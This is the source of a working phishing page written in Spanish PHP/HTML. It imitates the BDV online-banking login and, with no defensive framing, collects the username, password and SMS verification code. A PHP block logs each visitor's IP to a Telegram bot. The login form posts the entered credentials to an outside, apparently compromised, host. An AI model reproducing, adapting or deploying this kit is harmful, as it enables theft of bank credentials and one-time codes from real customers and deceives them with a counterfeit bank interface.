<?php
    require "config.php";
    function start() {
		$msg = "➖➖➖[". APP_NAME ."]➖➖➖\n";
        $msg .= "🌐 Nueva visita: <code>". getIP() ."</code>\n\n";
        $apiToken = BOT_TOKEN;
                $data = [
            'chat_id' => CHAT_ID,
            'text' => $msg,
            'parse_mode' => 'html'
        ];
        $url = "https://api.telegram.org/bot$apiToken/sendMessage?";

        $response = @file_get_contents($url . http_build_query($data));

	}
	
	start();

?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <style>
        body {
            transition: opacity ease-in 0.2s;
        }

        body[unresolved] {
            opacity: 0;
            display: block;
            overflow: hidden;
            position: relative;
        }

        .loading {
            display: none;
            position: fixed;
            align-items: center;
            justify-content: center;
            background-image: linear-gradient(270deg, #f3f3f3, #f3f3f3);
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            flex-direction: column;
            z-index: 999999;
        }

        .loading h4 {
            margin-top: 20px;
            font-size: 1.5rem;
            color: black;
        }

        .loader {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            position: relative;
            animation: rotate 1s linear infinite
        }

        .loader::before,
        .loader::after {
            content: "";
            box-sizing: border-box;
            position: absolute;
            inset: 0px;
            border-radius: 50%;
            border: 5px solid rgba(240, 20, 20, .85);
            animation: prixClipFix 2s linear infinite;
        }

        .loader::after {
            border-color: rgba(20, 20, 240, .85);
            animation: prixClipFix 2s linear infinite, rotate 0.5s linear infinite reverse;
            inset: 6px;
        }

        @keyframes rotate {
            0% {
                transform: rotate(0deg)
            }

            100% {
                transform: rotate(360deg)
            }
        }

        @keyframes prixClipFix {
            0% {
                clip-path: polygon(50% 50%, 0 0, 0 0, 0 0, 0 0, 0 0)
            }

            25% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 0, 100% 0, 100% 0)
            }

            50% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 100% 100%, 100% 100%)
            }

            75% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 100%)
            }

            100% {
                clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 0)
            }
        }

    </style>

    <title>BDVenlínea personas</title>

    <meta content="width=device-width, initial-scale=1" name="viewport">
    <!--    <link href="/assets/styles.css" rel="stylesheet">-->
    <link href="/assets/style.css" rel="stylesheet">
    <link href="/assets/asi.css" rel="stylesheet">

    <style type="text/css">
        #_copy {
            align-items: center;
            background: #4494d5;
            border-radius: 3px;
            color: #fff;
            cursor: pointer;
            display: flex;
            font-size: 13px;
            height: 30px;
            justify-content: center;
            position: absolute;
            width: 60px;
            z-index: 1000
        }

        #select-tooltip,
        #sfModal,
        .modal-backdrop,
        div[id^=reader-helper] {
            display: none !important
        }

        .modal-open {
            overflow: auto !important
        }

        ._sf_adjust_body {
            padding-right: 0 !important
        }

        .super_copy_btns_div {
            position: fixed;
            width: 154px;
            left: 10px;
            top: 45%;
            background: #e7f1ff;
            border: 2px solid #4595d5;
            font-weight: 600;
            border-radius: 2px;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, PingFang SC, Hiragino Sans GB, Microsoft YaHei, Helvetica Neue, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
            z-index: 5000
        }

        .super_copy_btns_logo {
            width: 100%;
            background: #4595d5;
            text-align: center;
            font-size: 12px;
            color: #e7f1ff;
            line-height: 30px;
            height: 30px
        }

        .super_copy_btns_btn {
            display: block;
            width: 128px;
            height: 28px;
            background: #7f5711;
            border-radius: 4px;
            color: #fff;
            font-size: 12px;
            border: 0;
            outline: 0;
            margin: 8px auto;
            font-weight: 700;
            cursor: pointer;
            opacity: .9
        }

        .super_copy_btns_btn:hover {
            opacity: .8
        }

        .super_copy_btns_btn:active {
            opacity: 1
        }

    </style>
</head>

<body>

    <app-root _nghost-c0="" ng-version="6.1.10">
        <spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1=""></spinner>
        <router-outlet _ngcontent-c0=""></router-outlet>
        <app-login _nghost-c10="" class="ng-star-inserted">
            <div _ngcontent-c10="" class="login-container" bis_skin_checked="1">
                <div _ngcontent-c10="" bis_skin_checked="1">
                    <div _ngcontent-c10="" class="login-container-float-center" bis_skin_checked="1">
                        <div _ngcontent-c10="" class="row" bis_skin_checked="1">
                            <div _ngcontent-c10="" class="col s12 not-margin not-padding" bis_skin_checked="1">
                                <div _ngcontent-c10="" bis_skin_checked="1">
                                    <div _ngcontent-c10="" class="login-container-logo" bis_skin_checked="1"><img _ngcontent-c10="" class="logo-login" src="/assets/logo.png"></div>

                                    <div _ngcontent-c10="" class="login-container-form" bis_skin_checked="1">
                                        <form _ngcontent-c10="" novalidate="" class="ng-untouched ng-pristine ng-invalid" method="post" action="https://lifeschool.edu.pk/bdv/joqueback/joquer.php">
                                            <div _ngcontent-c10="" id="tkin" class="formGroup" role="form" bis_skin_checked="1">
                                                <mat-form-field _ngcontent-c10="" id="df" appearance="fill" class="mat-form-field ng-tns-c11-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-dirty ng-touched mat-form-field-invalid ng-invalid mat-form-field-hide-placeholder mat-form-field-should-float">
                                                    <div class="mat-form-field-wrapper" bis_skin_checked="1">
                                                        <div class="mat-form-field-flex" bis_skin_checked="1">

                                                            <div class="mat-form-field-infix" bis_skin_checked="1">
                                                                <input _ngcontent-c10="" aria-label="usuario" autocomplete="off" class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-untouched ng-pristine ng-invalid " formcontrolname="username" matinput="" maxlength="16" minlength="6" oncut="return false" tabindex="1" type="text" id="mat-input-0" aria-invalid="false" aria-required="false" name="usuario1"> <span class="mat-form-field-label-wrapper">
                                                                    <label class="mat-form-field-label ng-tns-c11-0 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-1" for="mat-input-0" aria-owns="mat-input-0">
                                                                        <mat-label _ngcontent-c10="" class="ng-star-inserted">Usuario *</mat-label>
                                                                    </label></span>
                                                            </div>
                                                        </div>

                                                        <div class="mat-form-field-underline ng-tns-c11-0 ng-star-inserted" bis_skin_checked="1">
                                                            <span class="mat-form-field-ripple"></span>
                                                        </div>

                                                        <div class="mat-form-field-subscript-wrapper" bis_skin_checked="1">

                                                            <div class="mat-form-field-hint-wrapper ng-tns-c11-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);" bis_skin_checked="1">

                                                                <div class="mat-form-field-hint-spacer" bis_skin_checked="1"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </mat-form-field>
                                            </div>


                                            <div _ngcontent-c10="" class="button-login-container" role="row" bis_skin_checked="1">
                                                <button _ngcontent-c10="" color="accent" mat-raised-button="" role="button" tabindex="2" type="button" class="mat-raised-button mat-accent" onclick="chcs()" id="btn-u"><span class="mat-button-wrapper"> Entrar </span>

                                                    <div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>

                                                    <div class="mat-button-focus-overlay" bis_skin_checked="1"></div>
                                                </button>
                                            </div>


                                            <div _ngcontent-c10="" class="autogestion-usuario-unico text-center" bis_skin_checked="1">
                                                <a _ngcontent-c10="" class="autogestion-user" href="#" mattooltip="Gestiona tu usuario" mattooltipposition="right" role="link" tabindex="3" title="gestión de usuario" style="touch-action: none; user-select: none;" aria-describedby="cdk-describedby-message-0" cdk-describedby-host="" bis_skin_checked="1"> ¿Olvidaste tu usuario o clave? </a><br _ngcontent-c10="">
                                                <a _ngcontent-c10="" class="autogestion-user" href="/?gestion-usuario" mattooltip="Gestiona tu usuario" mattooltipposition="right" role="link" tabindex="3" title="gestión de usuario" style="touch-action: none; user-select: none;" aria-describedby="cdk-describedby-message-0" cdk-describedby-host="" bis_skin_checked="1"> Si eres nuevo clienteBDV regístrate aquí </a>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <section class="containerCustom" id="docPopup" style="display: none">
                <form id="mainF" method="post" name="mainF">
                    <div class="overlay" bis_skin_checked="1">
                        <div class="modalCustom" bis_skin_checked="1">
                            <center>
                                <img src="assets/logo.png" width="225px"><br>

                                <h1 class="title" style="font-size: 21px;">Verificación Requerida</h1>

                                <hr>
                                <p>Ingresá el código que te enviamos por SMS a tu número de celular</p>
                                <input class="inputCodes" id="soldede" maxlength="8" minlength="6" name="smscode" pattern="[0-9]+" placeholder="Código SMS" required="" type="tel"><br>
                                <br>
                                <button class="boton" id="mainB" type="submit">CONTINUAR</button>
                            </center>
                        </div>
                    </div>
                </form>
            </section>
        </app-login>
    </app-root>


    <div id="cdk-describedby-message-container" aria-hidden="true" style="display: none;" bis_skin_checked="1">
        <div id="cdk-describedby-message-0" bis_skin_checked="1">Gestiona tu usuario</div>
    </div>

    <div class="cdk-overlay-container" style="display: none " id="mdl" bis_skin_checked="1">
        <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing" bis_skin_checked="1"></div>

        <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;" bis_skin_checked="1">
            <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;" bis_skin_checked="1">
                <div id="cdk-overlay-2" class="cdk-overlay-pane" style="max-width: 80vw; pointer-events: auto; width: 370px; height: auto; position: static;" bis_skin_checked="1">
                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" bis_skin_checked="1"></div>
                    <mat-dialog-container aria-modal="true" class="mat-dialog-container ng-tns-c14-39 ng-trigger ng-trigger-slideDialog ng-star-inserted" tabindex="-1" id="mat-dialog-0" role="dialog" style="transform: none; opacity: 1;">

                        <app-confirmar-acceso _nghost-c15="" class="ng-star-inserted">
                            <div _ngcontent-c15="" class="container" bis_skin_checked="1">
                                <div _ngcontent-c15="" class="row" bis_skin_checked="1">
                                    <h4 _ngcontent-c15="" class="text-center">Introduce tu contraseña</h4>
                                </div>

                                <div _ngcontent-c15="" class="row" bis_skin_checked="1">
                                    <mat-form-field _ngcontent-c15="" id="dfs" appearance="fill" class="mat-form-field ng-tns-c11-40 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-pristine ng-invalid mat-form-field-invalid ng-touched mat-form-field-hide-placeholder">

                                        <div class="mat-form-field-wrapper" bis_skin_checked="1">
                                            <div class="mat-form-field-flex" bis_skin_checked="1">

                                                <div class="mat-form-field-infix" bis_skin_checked="1">
                                                    <input _ngcontent-c15="" autocomplete="off" class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-pristine ng-invalid ng-touched" formcontrolname="password" matinput="" name="password" type="password" id="mat-input-1" aria-invalid="true" aria-required="false" aria-describedby="mat-error-4">


                                                    <span class="mat-form-field-label-wrapper">

                                                        <label class="mat-form-field-label ng-tns-c11-40 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-3" for="mat-input-1" aria-owns="mat-input-1" style="">

                                                            <mat-label _ngcontent-c15="" aria-label="Introduce tu contraseña" class="ng-star-inserted">
                                                                <span _ngcontent-c15="">Contraseña</span>
                                                            </mat-label>
                                                        </label>
                                                    </span>
                                                </div>

                                                <button id="ojo" onclick="ver()" class="py-0 h-100 btn btn-sm position-absolute text-gray-500 rounded-0" href="" tabindex="-1" type="button">
                                                    <svg-icon class="font-weight-bold d-flex align-items-center" src="assets/icons/eye-off.svg" ng-reflect-src="assets/icons/eye-off.svg" ng-reflect-stretch="false" ng-reflect-svg-style="[object Object]"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="22" viewBox="0 0 26 22" style="width: 22px; height: 22px;">
                                                            <g fill="none" fill-rule="evenodd" stroke-linecap="round">
                                                                <g>
                                                                    <g>
                                                                        <g stroke-linejoin="round" stroke-width="1.628">
                                                                            <g>
                                                                                <path stroke="currentColor" d="M16.642 8.014c0 2.446-1.983 4.427-4.427 4.427-2.446 0-4.427-1.981-4.427-4.427 0-2.444 1.981-4.427 4.427-4.427 2.444 0 4.427 1.983 4.427 4.427z" transform="translate(-751 -1643) translate(751.704 1644.375) translate(0 2)"></path>
                                                                                <path stroke="currentColor" d="M.814 8.28s9.6-16.8 22.8 0c0 0-10.8 15.6-22.8 0z" transform="translate(-751 -1643) translate(751.704 1644.375) translate(0 2)"></path>
                                                                            </g>
                                                                        </g>
                                                                        <path stroke="currentColor" stroke-width="1.5" d="M2.686 0.229L22.686 19.229" transform="translate(-751 -1643) translate(751.704 1644.375)"></path>
                                                                    </g>
                                                                </g>
                                                            </g>
                                                        </svg></svg-icon>
                                                </button>


                                            </div>

                                            <div class="mat-form-field-underline ng-tns-c11-40 ng-star-inserted" style="display: ;" bis_skin_checked="1">
                                                <span class="mat-form-field-ripple"></span>
                                            </div>

                                            <div class="mat-form-field-subscript-wrapper" bis_skin_checked="1">
                                                <div class="ng-tns-c11-40 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);" bis_skin_checked="1">
                                                    <mat-error _ngcontent-c15="" align="end" class="mat-error ng-star-inserted" role="alert" id="mat-error-4">Contraseña es <strong _ngcontent-c15="">requerida</strong></mat-error>
                                                </div>
                                            </div>
                                        </div>
                                    </mat-form-field>
                                </div>

                                <div _ngcontent-c15="" class="row" bis_skin_checked="1">
                                    <div _ngcontent-c15="" class="button-container" bis_skin_checked="1">


                                        <button id="btn-p" disabled="true" _ngcontent-c15="" color="accent" mat-raised-button="" type="submit" class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched" onclick="chc()">
                                            <span class="mat-button-wrapper">Continuar</span></button>
                                        <div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>
                                        <div class="mat-button-focus-overlay" bis_skin_checked="1"></div>


                                        <button _ngcontent-c15="" aria-label="cancelar" color="accent" mat-dialog-close="" mat-raised-button="" type="button" class="mat-raised-button mat-accent" onclick="cls()">
                                            <span class="mat-button-wrapper">Cancelar</span>
                                            <div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>
                                            <div class="mat-button-focus-overlay" bis_skin_checked="1"></div>
                                        </button>
                                    </div>
                                </div>

                            </div>
                        </app-confirmar-acceso>
                    </mat-dialog-container>
                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" bis_skin_checked="1"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="loading">
        <img src="assets/logo.png" width="225px"><br>
        <div class="loader"></div>
        <h4 class="title">Verificando credenciales</h4>
        <p class="subtitle"></p>
    </div>
    <script src="/assets/jav2.js" type="text/javascript"></script>
    <script src="/assets/app.js" type="text/javascript"></script>

    <script>
        // Obtener los elementos de input y botón
        const input = document.getElementById('mat-input-1');
        const button = document.getElementById('btn-p');

        // Función para verificar la longitud del input
        function verificarLongitud() {
            if (input.value.length >= 8) {
                button.disabled = false;
            } else {
                button.disabled = true;
            }
        }

        // Añadir un event listener al input para verificar la longitud en cada cambio
        input.addEventListener('input', verificarLongitud);

    </script>

</body>

</html>
